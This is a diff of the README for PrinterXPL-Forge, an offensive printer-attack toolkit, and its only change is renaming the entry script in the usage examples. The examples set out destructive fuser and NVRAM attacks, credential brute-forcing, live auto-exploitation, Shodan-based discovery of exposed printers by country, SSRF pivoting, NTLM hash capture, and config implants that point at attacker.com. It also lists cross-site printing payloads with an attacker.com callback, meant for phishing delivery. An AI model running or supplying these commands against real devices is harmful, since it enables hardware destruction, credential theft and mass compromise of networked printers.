@@ -54,17 +54,17 @@ PrinterXPL-Forge includes a dedicated **Destructive Attack Audit** mode that sca
 
 ```bash
 # Assess-only (dry-run — SAFE, no payloads sent)
-python src/main.py 192.168.1.100 --destructive-audit
+python pxf.py 192.168.1.100 --destructive-audit
 
 # Live execution — sends destructive payloads (AUTHORIZED LAB ONLY)
-python src/main.py 192.168.1.100 --destructive-audit --no-dry
+python pxf.py 192.168.1.100 --destructive-audit --no-dry
 
 # Specific modules only
-python src/main.py 192.168.1.100 --destructive-audit \
+python pxf.py 192.168.1.100 --destructive-audit \
   --destructive-modules research-fuser-thermal-attack,research-brother-nvram
 
 # Interactive menu: choose option [D] DESTRUCTIVE AUDIT
-python src/main.py
+python pxf.py
 ```
 
 ### Implemented Physical Destruction Modules
@@ -144,7 +144,7 @@ bash setup_venv.sh          # Linux / macOS
 
 ./run.sh --help
 # or
-python printerxpl-forge.py --version
+python pxf.py --version
 ```
 
 Manual venv (alternative):
@@ -155,7 +155,7 @@ source .venv/bin/activate        # Linux / macOS
 .venv\Scripts\activate           # Windows PowerShell
 pip install -r requirements.txt
 export PYTHONPATH=src
-python src/main.py --version
+python pxf.py --version
 ```
 
 **Requirements:** Python 3.8+ · Windows / Linux / macOS · 80 MB disk
@@ -165,21 +165,21 @@ python src/main.py --version
 ## Entry Point
 
 ```bash
-python printerxpl-forge.py [target] [mode] [options]
+python pxf.py [target] [mode] [options]
 ```
 
 | Example | What it does |
 |---------|-------------|
-| `python printerxpl-forge.py` | Interactive guided menu |
-| `python printerxpl-forge.py --help` | Full flag reference |
-| `python printerxpl-forge.py 192.168.1.100 --scan` | Passive fingerprint + CVE scan |
-| `python printerxpl-forge.py 192.168.1.100 pjl` | PJL interactive shell |
-| `python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-vendor epson` | Credential brute-force |
-| `python printerxpl-forge.py 192.168.1.100 --auto-exploit` | Auto exploit selection + execution |
-| `python printerxpl-forge.py 192.168.1.100 --attack-matrix` | Full attack campaign |
-| `python printerxpl-forge.py --discover-online --shodan --dork-vendor hp --dork-country BR` | Dork discovery via Shodan only |
-| `python printerxpl-forge.py --discover-online --dork-engine shodan,netlas --dork-vendor hp,epson --dork-country BR,AR` | Multi-engine, multi-vendor CSV |
-| `python printerxpl-forge.py --discover-online --dork-vendor hp --dork-country BR` | Dork discovery via all configured engines |
+| `python pxf.py` | Interactive guided menu |
+| `python pxf.py --help` | Full flag reference |
+| `python pxf.py 192.168.1.100 --scan` | Passive fingerprint + CVE scan |
+| `python pxf.py 192.168.1.100 pjl` | PJL interactive shell |
+| `python pxf.py 192.168.1.100 --bruteforce --bf-vendor epson` | Credential brute-force |
+| `python pxf.py 192.168.1.100 --auto-exploit` | Auto exploit selection + execution |
+| `python pxf.py 192.168.1.100 --attack-matrix` | Full attack campaign |
+| `python pxf.py --discover-online --shodan --dork-vendor hp --dork-country BR` | Dork discovery via Shodan only |
+| `python pxf.py --discover-online --dork-engine shodan,netlas --dork-vendor hp,epson --dork-country BR,AR` | Multi-engine, multi-vendor CSV |
+| `python pxf.py --discover-online --dork-vendor hp --dork-country BR` | Dork discovery via all configured engines |
 
 ---
 
@@ -189,24 +189,24 @@ By default PrinterXPL-Forge uses standard printer port numbers for each protocol
 
 ```bash
 # Printer with RAW on 3910 instead of 9100
-python printerxpl-forge.py 192.168.1.100 pjl --port-raw 3910
+python pxf.py 192.168.1.100 pjl --port-raw 3910
 
 # Full scan on a printer with non-standard ports
-python printerxpl-forge.py 192.168.1.100 --scan \
+python pxf.py 192.168.1.100 --scan \
   --port-raw 3910 \
   --port-ipp 8631 \
   --port-snmp 1161
 
 # Add extra ports to banner scan sweep
-python printerxpl-forge.py 192.168.1.100 --scan \
+python pxf.py 192.168.1.100 --scan \
   --extra-ports 9200 --extra-ports 7100
 
 # Brute-force with custom HTTP and FTP ports
-python printerxpl-forge.py 192.168.1.100 --bruteforce \
+python pxf.py 192.168.1.100 --bruteforce \
   --port-http 8080 --port-ftp 2121 --port-telnet 2323
 
 # Attack campaign respects all overrides
-python printerxpl-forge.py 192.168.1.100 --attack-matrix --port-raw 3910
+python pxf.py 192.168.1.100 --attack-matrix --port-raw 3910
 ```
 
 **Port override flags:**
@@ -234,13 +234,13 @@ Overrides are applied globally at startup — every module (banner scan, PJL, fi
 
 ```bash
 # SNMP sweep + installed printers on this host
-python printerxpl-forge.py --discover-local
+python pxf.py --discover-local
 
 # Passive OSINT check for a specific IP
-python printerxpl-forge.py 192.168.1.100 --osint
+python pxf.py 192.168.1.100 --osint
 
 # Detect supported languages without connecting
-python printerxpl-forge.py 192.168.1.100 --auto-detect
+python pxf.py 192.168.1.100 --auto-detect
 ```
 
 ### Online — Structured Dork Discovery (v3.12.0+)
@@ -252,38 +252,38 @@ python printerxpl-forge.py 192.168.1.100 --auto-detect
 
 ```bash
 # All Epson + Ricoh printers in Latin America, port 515 — all engines
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-vendor epson,ricoh \
   --dork-region latin_america \
   --dork-port 515
 
 # HP DeskJet Pro 5500 in Brazil — Shodan only (single engine flag)
-python printerxpl-forge.py --discover-online --shodan \
+python pxf.py --discover-online --shodan \
   --dork-vendor hp \
   --dork-model "deskjet pro 5500" \
   --dork-country BR
 
 # All printers in São Paulo port 9100 (CSV + single-country city filter)
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-country BR \
   --dork-city "Sao Paulo","Rio de Janeiro" \
   --dork-port 9100
 
 # Kyocera in Europe, 200 results — Netlas only
-python printerxpl-forge.py --discover-online --netlas \
+python pxf.py --discover-online --netlas \
   --dork-vendor kyocera \
   --dork-region europe \
   --dork-limit 200
 
 # Multiple vendors and countries via CSV — Shodan + ZoomEye (multi-engine)
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-engine shodan,zoomeye \
   --dork-vendor hp,canon \
   --dork-country BR,AR \
   --dork-port 9100,631
 
 # Five engines at once
-python printerxpl-forge.py --discover-online \
+python pxf.py --discover-online \
   --dork-engine shodan,censys,fofa,zoomeye,netlas \
   --dork-vendor epson --dork-port 9100
 ```
@@ -327,19 +327,19 @@ python printerxpl-forge.py --discover-online \
 
 ```bash
 # Full passive scan: banner grab + CVE/NVD lookup + exploit matching
-python printerxpl-forge.py 192.168.1.100 --scan
+python pxf.py 192.168.1.100 --scan
 
 # Same + ML fingerprinting and attack scoring
-python printerxpl-forge.py 192.168.1.100 --scan-ml
+python pxf.py 192.168.1.100 --scan-ml
 
 # Offline (skip NVD API)
-python printerxpl-forge.py 192.168.1.100 --scan --no-nvd
+python pxf.py 192.168.1.100 --scan --no-nvd
 
 # Scan + immediately match exploit modules
-python printerxpl-forge.py 192.168.1.100 --scan --xpl
+python pxf.py 192.168.1.100 --scan --xpl
 
 # Combined: scan auto-populates vendor + serial for bruteforce
-python printerxpl-forge.py 192.168.1.100 --scan --bruteforce
+python pxf.py 192.168.1.100 --scan --bruteforce
 ```
 
 ---
@@ -348,16 +348,16 @@ python printerxpl-forge.py 192.168.1.100 --scan --bruteforce
 
 ```bash
 # Auto-detect best language
-python printerxpl-forge.py 192.168.1.100 auto
+python pxf.py 192.168.1.100 auto
 
 # Specific languages
-python printerxpl-forge.py 192.168.1.100 pjl       # PJL: filesystem, NVRAM, control
-python printerxpl-forge.py 192.168.1.100 ps        # PostScript: operators, job capture
-python printerxpl-forge.py 192.168.1.100 pcl       # PCL: macro filesystem
+python pxf.py 192.168.1.100 pjl       # PJL: filesystem, NVRAM, control
+python pxf.py 192.168.1.100 ps        # PostScript: operators, job capture
+python pxf.py 192.168.1.100 pcl       # PCL: macro filesystem
 
 # Debug, batch, log modes
-python printerxpl-forge.py 192.168.1.100 pjl --debug
-python printerxpl-forge.py 192.168.1.100 pjl -i commands.txt -o session.log -q
+python pxf.py 192.168.1.100 pjl --debug
+python pxf.py 192.168.1.100 pjl -i commands.txt -o session.log -q
 ```
 
 **Key PJL commands:**
@@ -381,24 +381,24 @@ Automatic exploit selection, verification, parameter pre-filling, and execution.
 
 ```bash
 # Auto exploit (dry-run — safe)
-python printerxpl-forge.py 192.168.1.100 --auto-exploit
+python pxf.py 192.168.1.100 --auto-exploit
 
 # With serial number pre-filled to exploits that require it
-python printerxpl-forge.py 192.168.1.100 --auto-exploit --bf-serial XAABT77481
+python pxf.py 192.168.1.100 --auto-exploit --bf-serial XAABT77481
 
 # Live exploitation — AUTHORIZED LABS ONLY
-python printerxpl-forge.py 192.168.1.100 --auto-exploit --no-dry
+python pxf.py 192.168.1.100 --auto-exploit --no-dry
 
 # Restrict to a specific source
-python printerxpl-forge.py 192.168.1.100 --auto-exploit --xpl-source exploit-db
+python pxf.py 192.168.1.100 --auto-exploit --xpl-source exploit-db
 
 # Check more candidates, run top 3
-python printerxpl-forge.py 192.168.1.100 --auto-exploit \
+python pxf.py 192.168.1.100 --auto-exploit \
   --auto-exploit-limit 15 \
   --auto-exploit-run 3
 
 # Force a custom exploit file (parameters auto-filled)
-python printerxpl-forge.py 192.168.1.100 --auto-exploit \
+python pxf.py 192.168.1.100 --auto-exploit \
   --auto-exploit-file /path/to/my_exploit.py \
   --bf-serial XAABT77481
 ```
@@ -418,22 +418,22 @@ python printerxpl-forge.py 192.168.1.100 --auto-exploit \
 
 ```bash
 # Auto-detect vendor, use default wordlist
-python printerxpl-forge.py 192.168.1.100 --bruteforce
+python pxf.py 192.168.1.100 --bruteforce
 
 # Explicit vendor + serial (Epson / HP / Canon)
-python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-vendor epson --bf-serial XAABT77481
+python pxf.py 192.168.1.100 --bruteforce --bf-vendor epson --bf-serial XAABT77481
 
 # MAC-based tokens (OKI, Brother, Kyocera KR2)
-python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-vendor oki --bf-mac AA:BB:CC:DD:EE:FF
+python pxf.py 192.168.1.100 --bruteforce --bf-vendor oki --bf-mac AA:BB:CC:DD:EE:FF
 
 # Custom wordlist (replaces default)
-python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-wordlist /path/to/creds.txt
+python pxf.py 192.168.1.100 --bruteforce --bf-wordlist /path/to/creds.txt
 
 # Add individual credentials (highest priority)
-python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-cred admin:MyPass --bf-cred root:
+python pxf.py 192.168.1.100 --bruteforce --bf-cred admin:MyPass --bf-cred root:
 
 # No variation engine (faster)
-python printerxpl-forge.py 192.168.1.100 --bruteforce --bf-no-variations --bf-delay 2.0
+python pxf.py 192.168.1.100 --bruteforce --bf-no-variations --bf-delay 2.0
 ```
 
 **Protocols tested:** HTTP/HTTPS · FTP · SNMP community strings · Telnet
@@ -455,22 +455,22 @@ admin:hpinvent!
 
 ```bash
 # List all 150 modules sorted by CVSS
-python printerxpl-forge.py 192.168.1.100 --xpl-list
-python printerxpl-forge.py 192.168.1.100 --xpl-list --xpl-source exploit-db
+python pxf.py 192.168.1.100 --xpl-list
+python pxf.py 192.168.1.100 --xpl-list --xpl-source exploit-db
 
 # Non-destructive vulnerability check
-python printerxpl-forge.py 192.168.1.100 --xpl-check edb-35151
-python printerxpl-forge.py 192.168.1.100 --xpl-check edb-cve-2024-51978
+python pxf.py 192.168.1.100 --xpl-check edb-35151
+python pxf.py 192.168.1.100 --xpl-check edb-cve-2024-51978
 
 # Run exploit (dry-run default)
-python printerxpl-forge.py 192.168.1.100 --xpl-run edb-35151
-python printerxpl-forge.py 192.168.1.100 --xpl-run edb-35151 --no-dry  # live
+python pxf.py 192.168.1.100 --xpl-run edb-35151
+python pxf.py 192.168.1.100 --xpl-run edb-35151 --no-dry  # live
 
 # Download exploit from ExploitDB
-python printerxpl-forge.py --xpl-fetch 45273
+python pxf.py --xpl-fetch 45273
 
 # Rebuild index after adding modules
-python printerxpl-forge.py --xpl-update
+python pxf.py --xpl-update
 ```
 
 ### New HIGH/CRITICAL Modules Added in v6.1.0
@@ -553,13 +553,13 @@ Runs every attack category from BlackHat 2017 + 2024-2025 CVEs:
 
 ```bash
 # Dry-run (probe only)
-python printerxpl-forge.py 192.168.1.100 --attack-matrix
+python pxf.py 192.168.1.100 --attack-matrix
 
 # Live exploitation — AUTHORIZED LABS ONLY
-python printerxpl-forge.py 192.168.1.100 --attack-matrix --no-dry
+python pxf.py 192.168.1.100 --attack-matrix --no-dry
 
 # Combined with network map
-python printerxpl-forge.py 192.168.1.100 --attack-matrix --network-map --no-dry
+python pxf.py 192.168.1.100 --attack-matrix --network-map --no-dry
 ```
 
 **Categories:** DoS · Protection Bypass · Job Manipulation · Information Disclosure · CORS/XSP · SNMP write · Network pivoting
@@ -570,16 +570,16 @@ python printerxpl-forge.py 192.168.1.100 --attack-matrix --network-map --no-dry
 
 ```bash
 # SSRF audit via IPP/WSD
-python printerxpl-forge.py 192.168.1.100 --pivot
+python pxf.py 192.168.1.100 --pivot
 
 # Port-scan internal host via printer SSRF
-python printerxpl-forge.py 192.168.1.100 --pivot-scan 10.0.0.1
+python pxf.py 192.168.1.100 --pivot-scan 10.0.0.1
 
 # Full network map from printer's perspective
-python printerxpl-forge.py 192.168.1.100 --network-map
+python pxf.py 192.168.1.100 --network-map
 
 # LDAP NTLM hash capture
-python printerxpl-forge.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
+python pxf.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
 ```
 
 ---
@@ -588,23 +588,23 @@ python printerxpl-forge.py 192.168.1.100 --xpl-run research-ldap-hash-capture --
 
 ```bash
 # Storage audit: FTP, web file manager, SNMP MIB, saved jobs
-python printerxpl-forge.py 192.168.1.100 --storage
+python pxf.py 192.168.1.100 --storage
 
 # Firmware: version, upload endpoint check, NVRAM probe
-python printerxpl-forge.py 192.168.1.100 --firmware
+python pxf.py 192.168.1.100 --firmware
 
 # Factory reset (dry-run probes endpoints)
-python printerxpl-forge.py 192.168.1.100 --firmware-reset pjl
-python printerxpl-forge.py 192.168.1.100 --firmware-reset web
+python pxf.py 192.168.1.100 --firmware-reset pjl
+python pxf.py 192.168.1.100 --firmware-reset web
 
 # Persistent config implant
-python printerxpl-forge.py 192.168.1.100 --implant smtp_host=attacker.com
-python printerxpl-forge.py 192.168.1.100 --implant snmp_community=hacked
+python pxf.py 192.168.1.100 --implant smtp_host=attacker.com
+python pxf.py 192.168.1.100 --implant snmp_community=hacked
 
 # Language-specific payload injection
-python printerxpl-forge.py 192.168.1.100 --payload pjl:reset
-python printerxpl-forge.py 192.168.1.100 --payload ps:loop
-python printerxpl-forge.py 192.168.1.100 --payload ps:custom --payload-data "statusdict begin showROMfonts end"
+python pxf.py 192.168.1.100 --payload pjl:reset
+python pxf.py 192.168.1.100 --payload ps:loop
+python pxf.py 192.168.1.100 --payload ps:custom --payload-data "statusdict begin showROMfonts end"
 ```
 
 ---
@@ -613,11 +613,11 @@ python printerxpl-forge.py 192.168.1.100 --payload ps:custom --payload-data "sta
 
 ```bash
 # Generate attack payloads (deployed via phishing / watering hole)
-python printerxpl-forge.py 192.168.1.100 --xsp info
-python printerxpl-forge.py 192.168.1.100 --xsp capture --xsp-callback https://attacker.com/log
-python printerxpl-forge.py 192.168.1.100 --xsp dos
-python printerxpl-forge.py 192.168.1.100 --xsp nvram
-python printerxpl-forge.py 192.168.1.100 --xsp exfil
+python pxf.py 192.168.1.100 --xsp info
+python pxf.py 192.168.1.100 --xsp capture --xsp-callback https://attacker.com/log
+python pxf.py 192.168.1.100 --xsp dos
+python pxf.py 192.168.1.100 --xsp nvram
+python pxf.py 192.168.1.100 --xsp exfil
 ```
 
 ---
@@ -626,16 +626,16 @@ python printerxpl-forge.py 192.168.1.100 --xsp exfil
 
 ```bash
 # Full IPP security audit
-python printerxpl-forge.py 192.168.1.100 --ipp
+python pxf.py 192.168.1.100 --ipp
 
 # Submit anonymous print job (dry-run)
-python printerxpl-forge.py 192.168.1.100 --ipp-submit
-python printerxpl-forge.py 192.168.1.100 --ipp-submit --no-dry
+python pxf.py 192.168.1.100 --ipp-submit
+python pxf.py 192.168.1.100 --ipp-submit --no-dry
 
 # Send any file to printer
-python printerxpl-forge.py 192.168.1.100 --send-job document.pdf
-python printerxpl-forge.py 192.168.1.100 --send-job payload.ps --send-proto raw
-python printerxpl-forge.py 192.168.1.100 --send-job flyer.pdf --send-copies 10 --send-proto lpd
+python pxf.py 192.168.1.100 --send-job document.pdf
+python pxf.py 192.168.1.100 --send-job payload.ps --send-proto raw
+python pxf.py 192.168.1.100 --send-job flyer.pdf --send-copies 10 --send-proto lpd
 ```
 
 ---
@@ -748,7 +748,7 @@ Epson · HP · Brother · Ricoh · Xerox · Canon · Kyocera · Samsung · OKI �
 
 ```bash
 cp config.json.example config.json
-python printerxpl-forge.py --check-config
+python pxf.py --check-config
 ```
 
 ---
